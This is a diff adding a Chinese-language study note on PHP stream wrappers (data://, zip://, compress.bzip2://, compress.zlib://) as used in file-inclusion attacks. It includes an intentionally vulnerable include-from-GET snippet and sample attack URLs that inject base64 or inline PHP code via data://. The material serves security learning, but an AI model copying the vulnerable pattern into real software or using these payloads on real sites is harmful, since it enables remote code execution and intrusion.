@@ -180,3 +180,56 @@ $code=$_GET["a"];
 file_put_contents($code,"test");   
 ?>  
 ```
+## data://
+data:资源类型;编码,内容
+数据流封装器
+当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行
+
+``` php
+<?php  
+$filename=$_GET["a"];  
+include("$filename");  
+?>  
+```
+
+``` livecodeserver
+http://127.0.0.1/xxx.php?a=data://text/plain,<?php phpinfo()?>
+or
+http://127.0.0.1/xxx.php?a=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+
+或者
+http://127.0.0.1/cmd.php?file=data:text/plain,<?php phpinfo()?>
+or
+http://127.0.0.1/cmd.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+```
+
+ ## zip://, bzip2://, zlib://协议
+ 
+ 
+
+``` livecodeserver
+PHP.ini：
+zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；
+allow_url_fopen ：off/on
+allow_url_include：off/on
+```
+
+==3 个封装协议，都是直接打开压缩文件。
+compress.zlib://file.gz - 处理的是 '.gz' 后缀的压缩包
+compress.bzip2://file.bz2 - 处理的是 '.bz2' 后缀的压缩包
+zip://archive.zip#dir/file.txt - 处理的是 '.zip' 后缀的压缩包里的文件==
+
+## zip://协议
+使用方法：
+zip://archive.zip#dir/file.txt
+
+zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]**
+要用绝对路径+url编码#
+
+## bzip2://协议
+
+使用方法：
+compress.bzip2://file.bz2
+相对路径也可以
+
+![enter description here](https://githubimg/小书匠/1596642287558.png)
